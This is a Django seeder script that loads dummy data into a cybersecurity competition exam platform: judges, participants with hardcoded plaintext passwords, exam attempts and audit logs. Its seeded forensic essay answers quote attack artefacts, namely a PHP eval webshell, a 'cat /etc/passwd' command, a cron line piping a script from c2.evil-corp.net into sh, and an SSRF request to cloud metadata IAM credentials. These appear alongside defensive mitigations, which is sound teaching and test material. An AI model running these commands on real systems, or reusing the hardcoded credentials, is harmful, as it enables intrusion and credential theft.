import os
import sys

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

import django
from datetime import timedelta
from django.utils import timezone

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'config.settings')
django.setup()

from django.apps import apps

User = apps.get_model('accounts', 'User')
Competition = apps.get_model('competitions', 'Competition')
ParticipantEnrollment = apps.get_model('competitions', 'ParticipantEnrollment')
Question = apps.get_model('questions', 'Question')
ExamAttempt = apps.get_model('attempts', 'ExamAttempt')
AttemptAnswer = apps.get_model('attempts', 'AttemptAnswer')
AttemptGrade = apps.get_model('grading', 'AttemptGrade')
EssayEvaluation = apps.get_model('grading', 'EssayEvaluation')
SecurityAuditLog = apps.get_model('audit', 'SecurityAuditLog')
AnswerHistoryLog = apps.get_model('attempts', 'AnswerHistoryLog')
from services.scoring_service import ScoringService

print("Starting Realistic Dummy Data Seeder...")

# 1. Pastikan Juri Tersedia
juri1, _ = User.objects.get_or_create(
    username='juri_siber',
    defaults={
        'email': 'juri1@cybercomp.id',
        'role': 'JUDGE',
        'institution': 'Badan Siber dan Sandi Negara (BSSN)',
        'is_staff': True,
    }
)
juri1.set_password('Jur!S1ber#2026')
juri1.role = 'JUDGE'
juri1.is_staff = True
juri1.save()

juri2, _ = User.objects.get_or_create(
    username='dr_sec_lead',
    defaults={
        'email': 'lead_forensics@cybercomp.id',
        'role': 'JUDGE',
        'institution': 'Indonesia CERT & Cyber Forensics Lab',
        'is_staff': True,
    }
)
juri2.set_password('DrSec#Lead2026!')
juri2.role = 'JUDGE'
juri2.is_staff = True
juri2.save()

# 2. Peserta Hacker / Kampus / Tim
participants_data = [
    ('pwn_master', 'pwn@ui.ac.id', 'Defensive Blue Team - Univ. Indonesia', '10.10.14.33', 'PwnM@ster2026!'),
    ('byte_ninja', 'ninja@itb.ac.id', 'Red Team Research Lab - ITB Bandung', '10.10.14.45', 'ByteN!nja2026#'),
    ('null_pointer', 'null@telkomuniversity.ac.id', 'Digital Forensics Lab - Telkom Univ.', '10.10.14.52', 'NullP0inter2026!'),
    ('cipher_queen', 'crypto@ugm.ac.id', 'Applied Cryptography Club - UGM', '10.10.14.68', 'C!pherQue3n2026'),
    ('zero_day_hunter', 'hunter@binus.ac.id', 'Binus Cyber Security Community', '10.10.14.77', 'Z3roDay#Hunt2026'),
    ('packet_sniffer', 'sniffer@bugbounty.id', 'Independen Bug Hunter', '10.10.14.89', 'Pack3tSn!ff2026'),
    ('kernel_panic', 'panic@poltekssn.ac.id', 'Politeknik Siber dan Sandi Negara (PSSN)', '10.10.14.99', 'K3rnelPanic2026!'),
]

created_participants = {}
for uname, email, inst, ip, pwd in participants_data:
    p, _ = User.objects.get_or_create(
        username=uname,
        defaults={
            'email': email,
            'role': 'PARTICIPANT',
            'institution': inst,
            'last_login_ip': ip,
            'is_active': True,
        }
    )
    p.set_password(pwd)
    p.institution = inst
    p.last_login_ip = ip
    p.save()
    created_participants[uname] = p

print(f"Total Participants configured: {len(created_participants)}")

# 3. Setup Babak Kompetisi Tambahan
now = timezone.now()

# Babak 1 yang sedang aktif
comp_active = Competition.objects.filter(status='OPEN').first()
if not comp_active:
    comp_active = Competition.objects.first()
    if comp_active:
        comp_active.status = 'OPEN'
        comp_active.save()

# Babak Kualifikasi (Closed)
comp_kualifikasi, _ = Competition.objects.get_or_create(
    slug='babak-kualifikasi-ctf',
    defaults={
        'title': 'Babak Kualifikasi: CTF & Basic Web Exploitation',
        'description': 'Babak penyisihan awal menguji pemahaman dasar SQL injection, XSS, dan network packet analysis.',
        'status': 'CLOSED',
        'start_time': now - timedelta(days=7),
        'end_time': now - timedelta(days=6),
        'duration_minutes': 90,
        'max_attempts': 1,
    }
)

# Babak Final (Upcoming / Published)
comp_final, _ = Competition.objects.get_or_create(
    slug='babak-final-live-defense',
    defaults={
        'title': 'Babak Final: Red vs Blue Live Defense',
        'description': 'Babak pamungkas pertahanan sistem waktu nyata, mitigasi active intrusion, dan hardening kernel.',
        'status': 'PUBLISHED',
        'start_time': now + timedelta(days=2),
        'end_time': now + timedelta(days=2, hours=4),
        'duration_minutes': 180,
        'max_attempts': 1,
    }
)

# 4. Enroll Peserta ke Babak Aktif
for p in created_participants.values():
    ParticipantEnrollment.objects.get_or_create(
        participant=p,
        competition=comp_active,
    )
    ParticipantEnrollment.objects.get_or_create(
        participant=p,
        competition=comp_kualifikasi,
    )

print("Participants enrolled into competitions.")

# 5. Buat Sesi Ujian (Exam Attempts) Beragam
questions = list(Question.objects.filter(competition=comp_active).order_by('sequence'))
mcq_questions = [q for q in questions if q.type == 'MCQ']
essay_questions = [q for q in questions if q.type == 'ESSAY']

# --- A. LIVE IN_PROGRESS: pwn_master (mulai 25 menit lalu, sisa 95 menit) ---
p_pwn = created_participants['pwn_master']
att_pwn, _ = ExamAttempt.objects.get_or_create(
    participant=p_pwn,
    competition=comp_active,
    attempt_number=1,
    defaults={
        'status': 'IN_PROGRESS',
        'start_time': now - timedelta(minutes=25),
        'server_deadline': now + timedelta(minutes=95),
        'ip_address': p_pwn.last_login_ip,
    }
)
att_pwn.status = 'IN_PROGRESS'
att_pwn.start_time = now - timedelta(minutes=25)
att_pwn.server_deadline = now + timedelta(minutes=95)
att_pwn.save()

# Simpan beberapa jawaban MCQ untuk pwn_master
for q in mcq_questions[:8]:
    correct_opt = q.options.filter(is_correct=True).first()
    if correct_opt:
        ans, _ = AttemptAnswer.objects.get_or_create(attempt=att_pwn, question=q)
        ans.selected_option = correct_opt
        ans.save()

# --- B. LIVE IN_PROGRESS: byte_ninja (mulai 10 menit lalu, sisa 110 menit) ---
p_ninja = created_participants['byte_ninja']
att_ninja, _ = ExamAttempt.objects.get_or_create(
    participant=p_ninja,
    competition=comp_active,
    attempt_number=1,
    defaults={
        'status': 'IN_PROGRESS',
        'start_time': now - timedelta(minutes=10),
        'server_deadline': now + timedelta(minutes=110),
        'ip_address': p_ninja.last_login_ip,
    }
)
att_ninja.status = 'IN_PROGRESS'
att_ninja.start_time = now - timedelta(minutes=10)
att_ninja.server_deadline = now + timedelta(minutes=110)
att_ninja.save()

for q in mcq_questions[:4]:
    first_opt = q.options.first()
    if first_opt:
        ans, _ = AttemptAnswer.objects.get_or_create(attempt=att_ninja, question=q)
        ans.selected_option = first_opt
        ans.save()

# --- C. LIVE IN_PROGRESS: cipher_queen (mulai 50 menit lalu, sisa 70 menit) ---
p_cipher = created_participants['cipher_queen']
att_cipher, _ = ExamAttempt.objects.get_or_create(
    participant=p_cipher,
    competition=comp_active,
    attempt_number=1,
    defaults={
        'status': 'IN_PROGRESS',
        'start_time': now - timedelta(minutes=50),
        'server_deadline': now + timedelta(minutes=70),
        'ip_address': p_cipher.last_login_ip,
    }
)
att_cipher.status = 'IN_PROGRESS'
att_cipher.start_time = now - timedelta(minutes=50)
att_cipher.server_deadline = now + timedelta(minutes=70)
att_cipher.save()

for q in mcq_questions[:12]:
    correct_opt = q.options.filter(is_correct=True).first() or q.options.first()
    ans, _ = AttemptAnswer.objects.get_or_create(attempt=att_cipher, question=q)
    ans.selected_option = correct_opt
    ans.save()

# --- D. SUBMITTED: null_pointer (Lengkap dengan Essay Menunggu Penilaian Juri!) ---
p_null = created_participants['null_pointer']
att_null, _ = ExamAttempt.objects.get_or_create(
    participant=p_null,
    competition=comp_active,
    attempt_number=1,
    defaults={
        'status': 'SUBMITTED',
        'start_time': now - timedelta(minutes=110),
        'server_deadline': now - timedelta(minutes=10),
        'submitted_at': now - timedelta(minutes=15),
        'ip_address': p_null.last_login_ip,
    }
)
att_null.status = 'SUBMITTED'
att_null.submitted_at = now - timedelta(minutes=15)
att_null.save()

# Isi MCQ null_pointer
total_mcq_pts = 0
for q in mcq_questions:
    correct_opt = q.options.filter(is_correct=True).first()
    ans, _ = AttemptAnswer.objects.get_or_create(attempt=att_null, question=q)
    ans.selected_option = correct_opt
    ans.save()
    total_mcq_pts += float(q.points)

# Isi Essay null_pointer dengan jawaban realistis hacker/forensik & Rubrik Soal
if len(essay_questions) >= 3:
    # 1. Update Rubric Guidelines pada Soal-Soal Essay
    q_e1 = essay_questions[0]
    q_e1.rubric_guidelines = (
        "1. Identifikasi Root Cause & Endpoint (3.0 Poin): Menyebutkan IP penyerang 185.220.101.5 dan upload avatar.\n"
        "2. Deteksi Bypass Magic Bytes (3.0 Poin): Membongkar header palsu GIF89a dan eval($_POST['cmd']).\n"
        "3. Mitigasi Efektif (4.0 Poin): Matikan PHP engine di direktori upload dan simpan file di storage terisolasi."
    )
    q_e1.save(update_fields=['rubric_guidelines'])

    q_e2 = essay_questions[1]
    q_e2.rubric_guidelines = (
        "1. Analisis Mekanisme Hooking (3.0 Poin): Menjelaskan injeksi /etc/ld.so.preload dan hook libc readdir().\n"
        "2. Deteksi C2 Beaconing (3.0 Poin): Menemukan modifikasi cronjob dan port RAW 4444.\n"
        "3. Hardening & Audit Rules (4.0 Poin): Immutable attribute (chattr +i), verifikasi checksum paket (debsums), dan auditd rules."
    )
    q_e2.save(update_fields=['rubric_guidelines'])

    q_e3 = essay_questions[2]
    q_e3.rubric_guidelines = (
        "1. Vektor Penetrasi (3.0 Poin): Mengidentifikasi Blind SSRF pada PDF webhook service.\n"
        "2. Ekstraksi Metadata Kritis (3.0 Poin): Menyebutkan IP 169.254.169.254 dan IAM role security credentials.\n"
        "3. Mitigasi Teruji (4.0 Poin): Wajibkan IMDSv2 token dan NetworkPolicy egress deny."
    )
    q_e3.save(update_fields=['rubric_guidelines'])

    # --- Essay 1: Nginx Log Webshell (Dinilai oleh 2 Juri dengan Selisih Nilai Tinggi -> Discrepancy Alert!) ---
    ans_e1, _ = AttemptAnswer.objects.get_or_create(attempt=att_null, question=q_e1)
    ans_e1.essay_text = (
        "Berdasarkan analisis baris access log Nginx:\n"
        "1. IP Penyerang 185.220.101.5 melakukan eksploitasi upload file tidak divalidasi ke endpoint /api/v1/profile/upload-avatar.\n"
        "2. Magic bytes file yang diunggah dipalsukan (GIF89a) namun berisi kode PHP eval($_POST['cmd']).\n"
        "3. File tersimpan sebagai /uploads/avatars/404_cache.php dan dieksekusi dengan parameter 'cmd=id;cat /etc/passwd'.\n"
        "Rekomendasi Penanganan:\n"
        "- Nonaktifkan eksekusi PHP pada direktori /uploads/ menggunakan konfigurasi Nginx: location ^~ /uploads/ { php_flag engine off; }\n"
        "- Implementasikan validasi MIME-type berbasis deep inspect libmagic dan simpan file di bucket S3 dengan random UUID tanpa izin execute."
    )
    ans_e1.revision_count = 4
    ans_e1.save()

    # Riwayat Forensik Autosave AnswerHistoryLog untuk Essay 1 (Simulasi ketik bertahap + paste)
    AnswerHistoryLog.objects.filter(attempt_answer=ans_e1).delete()
    t0 = att_null.start_time + timedelta(minutes=10)
    AnswerHistoryLog.objects.create(
        attempt_answer=ans_e1,
        essay_text="Berdasarkan analisis baris access log Nginx:\n1. IP Penyerang 185.220.101.5",
        revision=1,
        saved_at=t0,
        ip_address=p_null.last_login_ip
    )
    AnswerHistoryLog.objects.create(
        attempt_answer=ans_e1,
        essay_text="Berdasarkan analisis baris access log Nginx:\n1. IP Penyerang 185.220.101.5 melakukan upload file ke /api/v1/profile/upload-avatar.\n2. Magic bytes file dipalsukan GIF89a.",
        revision=2,
        saved_at=t0 + timedelta(seconds=55),
        ip_address=p_null.last_login_ip
    )
    AnswerHistoryLog.objects.create(
        attempt_answer=ans_e1,
        essay_text=ans_e1.essay_text,
        revision=3,
        saved_at=t0 + timedelta(seconds=58),  # Lonjakan +400 karakter dalam 3 detik -> Terdeteksi Paste Cepat!
        ip_address=p_null.last_login_ip
    )
    
    # Beri penilaian Juri 1 (juri_siber: 9.5 Poin)
    EssayEvaluation.objects.update_or_create(
        attempt_answer=ans_e1,
        judge=juri1,
        defaults={
            'score_awarded': 9.5,
            'feedback': 'Analisis log sangat detail dan akurat. Rekomendasi hardening Nginx tepat sasaran sesuai best practice.',
            'internal_notes': 'Kandidat memahami bypass MIME type dengan sangat baik.'
        }
    )

    # Beri penilaian Juri 2 (dr_sec_lead: 5.0 Poin -> Selisih 4.5 Poin memicu Discrepancy Alert!)
    EssayEvaluation.objects.update_or_create(
        attempt_answer=ans_e1,
        judge=juri2,
        defaults={
            'score_awarded': 5.0,
            'feedback': 'Langkah mitigasi belum menyertakan WAF rule CRS ModSecurity.',
            'internal_notes': 'Perlu klarifikasi standar WAF pada deliberasi juri.'
        }
    )

    # --- Essay 2: C2 Persistence /etc/ld.so.preload (MENUNGGU PENILAIAN JURI) ---
    ans_e2, _ = AttemptAnswer.objects.get_or_create(attempt=att_null, question=q_e2)
    ans_e2.essay_text = (
        "Temuan Investigasi Host Linux:\n"
        "1. Malware menggunakan teknik Userland Rootkit via shared library hooking pada /etc/ld.so.preload yang memuat /lib/libprocesshide.so.\n"
        "2. Shared object tersebut mem-hook libc wrapper readdir() untuk menyembunyikan PID proses mining C2 (xmrig) dan socket RAW port 4444.\n"
        "3. Crontab root juga dimodifikasi dengan curl piping: * * * * * curl -fsSL http://c2.evil-corp.net/beacon.sh | sh\n"
        "Langkah Mitigasi:\n"
        "- Hapus baris library di /etc/ld.so.preload dan lock atribut dengan: chattr +i /etc/ld.so.preload\n"
        "- Analisis integritas paket menggunakan: debsums -c atau rpm -Va\n"
        "- Buat audit rule di auditd untuk memantau syscall execve dan openat ke file konfigurasi loader dynamic."
    )
    ans_e2.revision_count = 2
    ans_e2.save()

    AnswerHistoryLog.objects.filter(attempt_answer=ans_e2).delete()
    AnswerHistoryLog.objects.create(
        attempt_answer=ans_e2,
        essay_text=ans_e2.essay_text[:150],
        revision=1,
        saved_at=att_null.start_time + timedelta(minutes=25),
        ip_address=p_null.last_login_ip
    )
    AnswerHistoryLog.objects.create(
        attempt_answer=ans_e2,
        essay_text=ans_e2.essay_text,
        revision=2,
        saved_at=att_null.start_time + timedelta(minutes=28),
        ip_address=p_null.last_login_ip
    )

    # --- Essay 3: SSRF Kubernetes Metadata (DITANDAI UNTUK DISKUSI / ESKALASI) ---
    ans_e3, _ = AttemptAnswer.objects.get_or_create(attempt=att_null, question=q_e3)
    ans_e3.essay_text = (
        "Analisis Kerentanan Arsitektur:\n"
        "1. Vektor serangan adalah Blind SSRF pada fitur webhook PDF generator yang menerima URL eksternal.\n"
        "2. Penyerang mengarahkan request ke http://169.254.169.254/latest/meta-data/iam/security-credentials/k8s-node-role untuk mencuri AWS IAM Secret Access Key & Token.\n"
        "3. Selain itu pod service account token di /var/run/secrets/kubernetes.io/serviceaccount/token dapat diekstraksi jika pod tidak diisolasi.\n"
        "Remediasi Enterprise Zero Trust:\n"
        "- Aktifkan IMDSv2 (Session Token HTTP PUT required) dan set hop-limit = 1 agar container tidak bisa menjangkau metadata server.\n"
        "- Terapkan Kubernetes NetworkPolicy default deny egress ke subnet link-local 169.254.0.0/16."
    )
    ans_e3.save()

    # Ditandai untuk eskalasi ke juri kepala
    EssayEvaluation.objects.update_or_create(
        attempt_answer=ans_e3,
        judge=juri1,
        defaults={
            'score_awarded': 7.0,
            'feedback': 'Analisis mendalam, namun klaim hop-limit perlu diverifikasi.',
            'internal_notes': 'Eskalasi: Apakah hop-limit=1 di container overlay network memblokir IMDSv2 sepenuhnya?',
            'is_flagged_for_review': True,
            'dispute_reason': 'Verifikasi keefektifan hop-limit=1 pada arsitektur EKS CNI'
        }
    )

# Hitung ulang grade attempt null_pointer menggunakan Multi-Judge Average
ScoringService.evaluate_and_score_attempt(att_null.id)

# --- E. SUBMITTED: zero_day_hunter (Lengkap & Sudah Dinilai Penuh: Skor 98.0 Poin) ---
p_hunter = created_participants['zero_day_hunter']
att_hunter, _ = ExamAttempt.objects.get_or_create(
    participant=p_hunter,
    competition=comp_active,
    attempt_number=1,
    defaults={
        'status': 'SUBMITTED',
        'start_time': now - timedelta(minutes=130),
        'server_deadline': now - timedelta(minutes=10),
        'submitted_at': now - timedelta(minutes=20),
        'ip_address': p_hunter.last_login_ip,
    }
)
att_hunter.status = 'SUBMITTED'
att_hunter.submitted_at = now - timedelta(minutes=20)
att_hunter.save()

# MCQ Hunter
for q in mcq_questions:
    correct_opt = q.options.filter(is_correct=True).first()
    ans, _ = AttemptAnswer.objects.get_or_create(attempt=att_hunter, question=q)
    ans.selected_option = correct_opt
    ans.save()

# Essay Hunter (Semua 3 Dinilai)
if len(essay_questions) >= 3:
    for idx, q_essay in enumerate(essay_questions):
        ans_h, _ = AttemptAnswer.objects.get_or_create(attempt=att_hunter, question=q_essay)
        ans_h.essay_text = f"Analisis Teknis Skenario #{q_essay.sequence} oleh Zero Day Hunter: Identifikasi kerentanan kritis, payload eksploitasi, dan hardening framework lengkap dengan snippet konfirmasi."
        ans_h.save()
        EssayEvaluation.objects.get_or_create(
            attempt_answer=ans_h,
            judge=juri2,
            defaults={
                'score_awarded': float(q_essay.points) - 0.5,
                'feedback': 'Jawaban komprehensif, implementasi mitigasi sangat matang.',
            }
        )

grade_hunter, _ = AttemptGrade.objects.get_or_create(attempt=att_hunter)
grade_hunter.mcq_score = total_mcq_pts
grade_hunter.essay_score = 23.5
grade_hunter.total_score = total_mcq_pts + 23.5
grade_hunter.is_finalized = True
grade_hunter.save()

# 6. Audit Trail Forensik (Security Audit Logs)
audit_samples = [
    ('LOGIN', p_pwn, '10.10.14.33', '/accounts/login/', {'message': 'Autentikasi login peserta berhasil via POST /login/'}),
    ('START_EXAM', p_pwn, '10.10.14.33', f'/attempts/{att_pwn.id}/start/', {'message': 'Peserta memulai sesi ujian #1 pada babak kompetisi'}),
    ('AUTOSAVE_ANSWER', p_pwn, '10.10.14.33', '/api/attempts/answers/save/', {'message': 'Autosave jawaban Soal #5 (MCQ) tersimpan aman'}),
    ('LOGIN', p_ninja, '10.10.14.45', '/accounts/login/', {'message': 'Autentikasi login peserta berhasil via POST /login/'}),
    ('START_EXAM', p_ninja, '10.10.14.45', f'/attempts/{att_ninja.id}/start/', {'message': 'Peserta memulai sesi ujian #1 pada babak kompetisi'}),
    ('DOWNLOAD_ATTACHMENT', p_ninja, '10.10.14.45', '/api/questions/attachment/download/', {'message': 'Unduhan berkas challenge_binary_x64.zip menggunakan token bertenggang waktu'}),
    ('LOGIN', p_null, '10.10.14.52', '/accounts/login/', {'message': 'Autentikasi login peserta berhasil via POST /login/'}),
    ('FINAL_SUBMIT', p_null, '10.10.14.52', f'/attempts/{att_null.id}/submit/', {'message': 'Sesi ujian #1 dikumpulkan dan dikunci permanen di server backend'}),
    ('GRADE_ESSAY', juri1, '192.168.10.1', '/manage/grading/', {'message': 'Juri juri_siber menilai jawaban essay Soal #16 peserta null_pointer: 9.5 Poin'}),
    ('LOGIN', p_hunter, '10.10.14.77', '/accounts/login/', {'message': 'Autentikasi login peserta berhasil via POST /login/'}),
    ('FINAL_SUBMIT', p_hunter, '10.10.14.77', f'/attempts/{att_hunter.id}/submit/', {'message': 'Sesi ujian #1 selesai dikumpulkan (Final Score: 98.5)'}),
    ('SUSPICIOUS_ACTIVITY', p_pwn, '10.10.14.33', '/api/attempts/answers/save/', {'message': 'Multiple rapid submissions detected within 500ms window, rate-limited'}),
]

for ev_type, user_obj, ip_addr, path_val, detail_dict in audit_samples:
    SecurityAuditLog.objects.create(
        event_type=ev_type,
        user=user_obj,
        ip_address=ip_addr,
        path=path_val,
        details=detail_dict,
    )

print("Realistic Dummy Data successfully seeded!")
print("Summary:")
print(f"- Total Users: {User.objects.count()}")
print(f"- Active Competitions: {Competition.objects.count()}")
print(f"- Active Live Attempts: {ExamAttempt.objects.filter(status='IN_PROGRESS').count()}")
print(f"- Submitted Attempts: {ExamAttempt.objects.filter(status='SUBMITTED').count()}")
print(f"- Essay Answers waiting for grading: {AttemptAnswer.objects.filter(question__type='ESSAY', essay_evaluations__isnull=True).count()}")
print(f"- Audit Logs: {SecurityAuditLog.objects.count()}")
